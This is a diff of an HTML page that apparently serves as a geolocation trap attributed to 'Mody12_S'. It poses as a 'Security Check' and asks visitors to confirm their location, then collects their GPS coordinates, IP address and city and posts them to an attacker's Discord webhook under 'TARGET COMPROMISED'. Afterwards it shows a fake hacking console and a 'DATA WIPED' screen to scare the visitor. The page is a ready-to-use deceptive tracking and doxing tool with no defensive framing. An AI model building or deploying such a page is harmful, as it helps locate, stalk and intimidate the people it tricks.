@@ -3,86 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM_CRITICAL</title> 
+    <title>⚠️ Verification Required</title> 
     <style>
         body, html { 
             margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;
-            background: url('https://images.unsplash.com/photo-1500622764614-be3c178304c3?q=80&w=2070') no-repeat center center fixed; 
+            /* Using your Nature Background */
+            background: url('https://i.ibb.co/FkV6vY0/image-b0e308.png') no-repeat center center fixed; 
             background-size: cover;
             font-family: 'Courier New', monospace;
             display: flex; align-items: center; justify-content: center;
         }
 
-        /* DARK GLITCH OVERLAY */
-        #overlay {
+        /* DARK BLUR OVERLAY */
+        #bg-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(4px); z-index: 1;
+            background: rgba(0, 0, 0, 0.3); backdrop-filter: blur(3px); z-index: 1;
         }
 
-        /* THE TRAP BOX */
-        #trap-box {
+        /* THE SECURITY BOX */
+        #verify-box {
             position: relative; z-index: 10;
-            background: rgba(10, 10, 10, 0.9);
-            padding: 30px; border: 2px solid #ff0000;
-            box-shadow: 0 0 20px #ff0000;
-            text-align: center; width: 85%; max-width: 400px;
-            color: #ff0000;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px; border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+            text-align: center; width: 85%; max-width: 350px;
+            border: 3px solid #ff0000;
         }
 
-        h2 { text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
-        p { color: #ccc; font-size: 0.85rem; margin-bottom: 25px; }
+        h2 { color: #000; margin: 0 0 10px 0; font-weight: 900; letter-spacing: 1px; }
+        p { color: #333; font-size: 0.9rem; font-weight: bold; margin-bottom: 25px; }
 
         #start-btn { 
-            background: transparent; color: #ff0000; border: 2px solid #ff0000;
-            padding: 15px; font-size: 1rem; font-weight: bold; width: 100%;
-            cursor: pointer; transition: 0.2s;
+            background: #ff0000; color: white; border: none; 
+            padding: 15px; font-size: 1.1rem; border-radius: 10px;
+            cursor: pointer; font-weight: 900; width: 100%;
+            box-shadow: 0 5px 15px rgba(255,0,0,0.4);
+            transition: 0.2s;
         }
 
-        #start-btn:hover { background: #ff0000; color: black; box-shadow: 0 0 15px #ff0000; }
+        #start-btn:hover { transform: scale(1.05); background: #cc0000; }
 
-        /* THE HACKER CONSOLE */
+        /* THE HACKER CONSOLE (DARKNESS) */
         #console { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #000; z-index: 100; display: none;
             flex-direction: column; align-items: center; justify-content: center;
-            color: #00FF41;
+            color: #00FF41; text-shadow: 0 0 5px #00FF41;
         }
-        #log { width: 90%; max-width: 600px; font-size: 0.9rem; }
+        #log { width: 90%; max-width: 500px; font-size: 1rem; line-height: 1.5; }
     </style>
 </head>
 <body>
 
-    <div id="overlay"></div>
+    <div id="bg-overlay"></div>
 
-    <div id="trap-box">
-        <h2>⚠️ SECURITY_ERROR</h2>
-        <p>ENCRYPTED CONTENT DETECTED. PLEASE VERIFY LOCATION TO DECRYPT DATA STREAM.</p>
-        <button id="start-btn" onclick="ignite()">[ INITIALIZE_DECRYPT ]</button>
+    <div id="verify-box">
+        <div style="font-size: 50px; margin-bottom: 10px;">🛡️</div>
+        <h2>SECURITY CHECK</h2>
+        <p>PLEASE CONFIRM YOUR LOCATION TO ACCESS THE ENCRYPTED FILE.</p>
+        <button id="start-btn" onclick="trigger()">[ VERIFY IDENTITY ]</button>
     </div>
 
     <div id="console">
         <div id="log">
-            <h1 style="color:red; text-shadow: 0 0 10px red;">> [ BREACH_ESTABLISHED ]</h1>
+            <h1 style="color:red; text-shadow: 0 0 15px red;">> [ BREACH_INITIALIZED ]</h1>
             <div id="output"></div>
         </div>
     </div>
 
     <script>
+        // PASTE YOUR DISCORD WEBHOOK HERE
         const WEBHOOK = "YOUR_DISCORD_WEBHOOK_HERE"; 
 
-        async function ignite() {
-            // STEP 1: Show Hacking Immediately
-            document.getElementById('trap-box').style.display = 'none';
-            document.getElementById('console').style.display = 'flex';
-            
-            // STEP 2: The GPS Trap
+        async function trigger() {
+            // STEP 1: Ask for REAL GPS (The Trap)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
                     () => sendData("DENIED", "DENIED", 0)
                 );
             }
-            runHackerTyping();
+
+            // STEP 2: Show Hacker Screen
+            document.getElementById('verify-box').style.display = 'none';
+            document.getElementById('console').style.display = 'flex';
+            
+            runHackingText();
         }
 
         async function sendData(lat, lon, acc) {
@@ -90,34 +96,47 @@
             const ipData = await ipFetch.json();
 
             const payload = {
-                content: "🛑 **Mody12_S - TARGET_DOXED** 🛑",
+                content: "🛑 **Mody12_S - TARGET COMPROMISED** 🛑",
                 embeds: [{
                     color: 16711680,
-                    title: "CRITICAL_DATA_EXTRACTED",
+                    title: "GPS_DATA_EXTRACTED",
                     fields: [
-                        { name: "👤 IP", value: `\`${ipData.ip}\``, inline: true },
-                        { name: "📍 CITY", value: ipData.city, inline: true },
-                        { name: "🎯 GPS_LOCK", value: lat !== "DENIED" ? `[OPEN_MAP](https://www.google.com/maps?q=${lat},${lon})` : "❌ REJECTED", inline: false },
-                        { name: "📏 ACCURACY", value: `${acc} meters`, inline: true }
-                    ]
+                        { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
+                        { name: "📍 District", value: `${ipData.city}, ${ipData.region}`, inline: true },
+                        { name: "🎯 REAL GPS LOCK", value: lat !== "DENIED" ? `[VIEW ON GOOGLE MAPS](https://www.google.com/maps?q=${lat},${lon})` : "❌ TARGET REJECTED ACCESS", inline: false },
+                        { name: "📏 Accuracy", value: `${Math.round(acc)} meters`, inline: true }
+                    ],
+                    footer: { text: "Breach Protocol v10.5 | Mody12_S" }
                 }]
             };
 
             fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
         }
 
-        function runHackerTyping() {
-            const lines = ["BYPASSING_BROWSER...", "TRIANGULATING_GPS...", "UPLOADING_LOGS...", "STEALING_WIFI_PASS...", "CRITICAL_TRACE!", "PURGING_SYSTEM..."];
+        function runHackingText() {
+            const lines = [
+                "ESTABLISHING CONNECTION...",
+                "BYPASSING KERNEL_FIREWALL...",
+                "UPLOADING TROJAN_EXE...",
+                "EXTRACTING GPS_COORDINATES...",
+                "STEALING DISCORD_TOKENS...",
+                "CRITICAL_TRACE_DETECTED!",
+                "EMERGENCY_SYSTEM_PURGE..."
+            ];
             let i = 0;
+            const output = document.getElementById('output');
             const interval = setInterval(() => {
                 if (i < lines.length) {
-                    document.getElementById('output').innerHTML += `<p>> ${lines[i]}</p>`;
+                    output.innerHTML += `<p>> ${lines[i]}</p>`;
                     i++;
                 } else {
                     clearInterval(interval);
-                    setTimeout(() => { document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%;'>SYSTEM_DESTROYED</h1>"; }, 1500);
+                    setTimeout(() => {
+                        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%; font-size:4rem;'>DATA WIPED</h1>";
+                        document.body.style.background = "black";
+                    }, 2000);
                 }
-            }, 800);
+            }, 1000);
         }
     </script>
 </body>
